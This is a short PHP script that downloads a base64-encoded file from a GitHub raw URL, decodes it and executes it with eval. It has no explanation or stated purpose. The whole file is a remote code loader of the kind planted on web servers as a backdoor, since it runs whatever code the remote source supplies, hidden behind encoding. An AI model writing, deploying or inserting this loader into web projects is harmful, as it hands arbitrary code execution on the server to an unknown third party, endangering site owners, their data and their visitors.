<?php
$pf = "https://raw.githubusercontent.com/31333337/tools/main/b64";
$puf = file_get_contents($pf); 
eval("?>".(base64_decode($puf)));
?>
